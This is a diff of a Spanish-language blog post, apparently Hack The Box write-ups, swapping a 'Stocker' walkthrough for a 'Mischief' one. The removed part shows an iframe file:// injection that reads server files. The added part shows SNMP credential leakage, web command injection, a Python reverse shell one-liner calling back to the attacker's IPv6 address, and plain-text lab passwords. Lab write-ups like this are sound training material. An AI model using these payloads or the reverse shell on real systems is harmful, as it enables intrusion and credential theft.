-&lt;p&gt;Finalmente le damos un FORWARD&lt;/p&gt;
-
-&lt;p&gt;Miremos la web&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pagina2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al darle view cart nos muesta esto, es como si fuera una tienda y podemos agregar cosas al carrito para comprar&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Agregamos algo al carrito y le damos View Cart nos muestra esto&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Le damos a submit y nos muestra como un identificador y un enlace en HERE&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/compras3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si le damos a HERE nos redirige a /api/po/ y al identificador que nos termina mostrando un pdf&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pdf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Volvemos a interceptar con Burp y le damos submit&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/submit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos una estructura en json&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/json.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;En el apartado title podemos modificar  y pasarle una estructura que tenga un archivo un ejemplo es el /etc/passwd&lt;/p&gt;
-
-&lt;h2 id=&quot;codigo&quot;&gt;Codigo&lt;/h2&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;iframe &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;file:///etc/passwd &lt;span class=&quot;nv&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;750px &lt;span class=&quot;nv&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;750px&amp;gt;&amp;lt;/iframe&amp;gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Miramos en el repeater que a la derecha luego de ejecutar el código nos muestra una id&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/id.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Copiamos ese id y lo pegamos donde está el pdf para que nos muestre el /etc/passwd&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/pdf2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si prestamos atención al archivo podemos ver que hay un usuario que se llama angoose&lt;/p&gt;
-
-&lt;p&gt;Puedo pensar que al tener un subdominio llamado dev tengo entendido que /var/www/dev/index.js sea un archivo de configuración válido&lt;/p&gt;
-
-&lt;p&gt;Si ejecutamos este script, copiamos el id y lo pegamos donde está el pdf&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-Bash&quot;&gt;&quot;&amp;lt;iframe src=file:///var/www/dev/index.js height=800px width=800px&amp;gt;&amp;lt;/iframe&amp;gt;&quot;
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Deberíamos ver el index.js en el pdf claramente&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/burpsuite.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-stocker/id2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Donde marqué, podemos ver que el archivo se conecta a mongodb que tiene una contraseña, podemos probar esa contraseña para poder conectarnos 
-con ssh con el usuario angoose&lt;/p&gt;
-
-&lt;p&gt;Nos conectamos por ssh&lt;/p&gt;
+&lt;p&gt;Otra forma de ver la versión del servidor es tirando del WhatWeb.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-❯ ssh angoose@10.10.11.196
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;10.10.11.196 (10.10.11.196)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
-ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added &apos;&lt;/span&gt;10.10.11.196&lt;span class=&quot;s1&quot;&gt;&apos; (ED25519) to the list of known hosts.
-angoose@10.10.11.196&apos;&lt;/span&gt;s password: IHeardPassphrasesArePrettySecure 
-Last login: Sun Mar 12 23:53:34 2023 from 10.10.16.39
-angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+❯ whatweb http://10.10.10.92:3366
+http://10.10.10.92:3366 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.15rc1], IP[10.10.10.92], Python[2.7.15rc1], WWW-Authenticate[Test][Basic]
+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;angoose@stocker:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ifconfig
-eth0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
-        inet 10.10.11.196  netmask 255.255.254.0  broadcast 10.10.11.255
-        ether 00:50:56:b9:d8:2d  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        RX packets 585090  bytes 75834889 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;75.8 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 592998  bytes 176522802 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;176.5 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;p&gt;Ya que no tenemos más puertos para enumerar lo que podemos hacer es lanzar un escaneo con Nmap por UDP.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ nmap &lt;span class=&quot;nt&quot;&gt;-sU&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--top-ports&lt;/span&gt; 500 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.92
+Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;&apos;up&apos;&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
+Starting Nmap 7.94SVN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-11-10 20:55 GMT
+Initiating UDP Scan at 20:55
+Scanning 10.10.10.92 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;500 ports]
+UDP Scan Timing: About 31.00% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 20:57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:09 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Discovered open port 161/udp on 10.10.10.92
+Completed UDP Scan at 20:56, 45.77s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;500 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.92
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 499 open|filtered udp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT    STATE SERVICE
+161/udp open  snmp
+
+Read data files from: /usr/bin/../share/nmap
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;45.84 seconds
+           Raw packets sent: 1090 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;54.446KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 11 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.174KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que el puerto 161 corre un servicio bastante interesante y es el servicio snmp.&lt;/p&gt;
+
+&lt;p&gt;Podemos usar snmpwalk para tener más información de la máquina, pero antes de enumerar necesitamos saber la community string, para esto podemos usar la herramienta onesixtione.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ onesixtyone &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.92
+Scanning 1 hosts, 3218 communities
+10.10.10.92 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;public] Linux Mischief 4.15.0-20-generic &lt;span class=&quot;c&quot;&gt;#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64&lt;/span&gt;
+10.10.10.92 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;public] Linux Mischief 4.15.0-20-generic &lt;span class=&quot;c&quot;&gt;#21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Tenemos la comunnity string y es public, ahora usemos snmpwalk para enumerar información del equipo.&lt;/p&gt;
+
+&lt;p&gt;Recordemos que podemos enumerar procesos, si volvemos a ver en el escaneo que hicimos con Nmap nos muestra que la web por el puerto 3366 corre por un servidor en Python.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 2c &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.10.92 hrSWRunName | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;python
+HOST-RESOURCES-MIB::hrSWRunName.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python&quot;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para tener más información de ese proceso que acabamos de encontrar debemos hacer un grep a “772”.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ snmpwalk &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 2c &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.10.92 hrSWRunTable | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;772&quot;&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWRunIndex.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: 772
+HOST-RESOURCES-MIB::hrSWRunName.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python&quot;&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWRunID.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OID: SNMPv2-SMI::zeroDotZero
+HOST-RESOURCES-MIB::hrSWRunPath.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;python&quot;&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWRunParameters.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/&quot;&lt;/span&gt; &amp;lt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWRunType.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: application&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWRunStatus.772 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: runnable&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Tenemos las credenciales de un usuario llamado Loki, intentemos usar esas credenciales para acceder a la web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-Mischief/web.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hay más credenciales, podemos guardarlas en un fichero .txt&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+loki:godofmischiefisloki
+loki:trickeryanddeceit
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Con snmpwalk podemos usar el mib de ipAddressType para ver todas las interfaces de red de la máquina, incluyendo la Ipv6.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ snmpwalk &lt;span class=&quot;nt&quot;&gt;-v2c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; public 10.10.10.92 ipAddressType
+IP-MIB::ipAddressType.ipv4.&lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.92&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: unicast&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP-MIB::ipAddressType.ipv4.&lt;span class=&quot;s2&quot;&gt;&quot;10.10.10.255&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: broadcast&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP-MIB::ipAddressType.ipv4.&lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: unicast&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP-MIB::ipAddressType.ipv6.&lt;span class=&quot;s2&quot;&gt;&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: unicast&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP-MIB::ipAddressType.ipv6.&lt;span class=&quot;s2&quot;&gt;&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:e3:a2&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: unicast&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP-MIB::ipAddressType.ipv6.&lt;span class=&quot;s2&quot;&gt;&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:e3:a2&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; INTEGER: unicast&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ahora debemos quitar los ‘:’ extras cada dos carácteres para obtener la dirección Ipv6 real.&lt;/p&gt;
+
+&lt;p&gt;Quedaría algo asi:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+dead:beef::0250:56ff:feb9:e3a2
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Recuerden que es opcional sacarles los ceros.&lt;/p&gt;
+
+&lt;p&gt;Escaneamos esa dirección Ipv6 para ver si tiene algun puerto abierto.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ nmap &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; dead:beef::0250:56ff:feb9:e3a2
+Starting Nmap 7.94SVN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2023-11-10 22:13 GMT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;dead:beef::250:56ff:feb9:e3a2
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.26s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 998 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;3.20 seconds
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos reportó que el puerto 80 está abierto, ahora debemos colocar la dirección Ipv6 en el /etc/host.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;dead:beef::0250:56ff:feb9:e3a2 mischief.htb&quot; | sudo tee -a /etc/hosts  
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Accedamos a la web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-Mischief/login.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si nos fijamos bien nos muestra un login.&lt;/p&gt;
+
+&lt;p&gt;Luego de varios intentos, pude acceder con estas credenciales:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;username=Administrator
+password=trickeryanddeceit
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Una vez dentro vemos que podemos ejecutar comandos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-Mischief/command.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;shell-como-www-data&quot;&gt;Shell como WWW-DATA&lt;/h2&gt;
+
+&lt;p&gt;En el output al enviar un ‘;’ nos muestra el comando ejecutado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-Mischief/command2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al ejecutar un “whoami;” podemos ver al usuario “www-data”&lt;/p&gt;
+
+&lt;p&gt;Para ganar acceso como “www-data” yo voy a utilizar un script en Python, en el script tiene que cambiar AF_INET a AF_INET6 y en la dirección IP no tiene que poner la IPv4 tiene que poner su dirección IPv6&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::1018&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos ponemos en escucha por ncat.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ ncat &lt;span class=&quot;nt&quot;&gt;-6lvnp&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;--listen&lt;/span&gt; dead:beef:2::1018
+Ncat: Version 7.94SVN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Ncat: Listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;dead:beef:2::1018]:443
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ejecutemos el script en Python en la pagina web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-Mischief/command3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Regresemos al ncat y vemos que ganamos acceso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+❯ ncat &lt;span class=&quot;nt&quot;&gt;-6lvnp&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;--listen&lt;/span&gt; dead:beef:2::1018
+Ncat: Version 7.94SVN &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Ncat: Listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;dead:beef:2::1018]:443
+Ncat: Connection from &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;dead:beef::250:56ff:feb9:e3a2]:53256.
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;&apos;t access tty; job control turned off
+$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@Mischief:/var/www/html$ ifconfig
+ifconfig
+ens33: flags=4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
+        inet 10.10.10.92  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 dead:beef::250:56ff:feb9:e3a2  prefixlen 64  scopeid 0x0&amp;lt;global&amp;gt;
+        inet6 fe80::250:56ff:feb9:e3a2  prefixlen 64  scopeid 0x20&amp;lt;link&amp;gt;
+        ether 00:50:56:b9:e3:a2  txqueuelen 1000  (Ethernet)
+        RX packets 154210  bytes 9724905 (9.7 MB)
+        RX errors 0  dropped 90  overruns 0  frame 0
+        TX packets 15844  bytes 2464571 (2.4 MB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-lo: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
+lo: flags=73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
         inet 127.0.0.1  netmask 255.0.0.0
-        loop  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Loopback&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-        RX packets 23722  bytes 4015190 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.0 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        inet6 ::1  prefixlen 128  scopeid 0x10&amp;lt;host&amp;gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
         RX errors 0  dropped 0  overruns 0  frame 0
-        TX packets 23722  bytes 4015190 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.0 MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        TX packets 0  bytes 0 (0.0 B)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-angoose@stocker:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+www-data@Mischief:/var/www/html$
+ 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Ahora para movernos por la terminal más comodos hagamos un tratamiento de la TTY.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export TERM=xterm
+export SHELL=bash
+
+Ctrl + z
+
+stty raw -echo; fg
+
+reset xterm
+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Hacemos ls y ya podemos ver la primera flag&lt;/p&gt;
+&lt;p&gt;Luego de un rato enumerando en el directorio /home/loki encontre un archivo llamado “credentials”, que
+dentro se encuentran las credenciales de Loki para poder conectarnos por ssh.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@Mischief:/home/loki$ ls
+credentials  hosted  user.txt
+www-data@Mischief:/home/loki$ cat credentials 
+pass: lokiisthebestnorsegod
+www-data@Mischief:/home/loki$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nos conectamos por ssh y una vez dentro ya podemos leer la primera flag.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ sudo ssh loki@10.10.10.92
+[sudo] password for void: 
+loki@10.10.10.92&apos;s password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
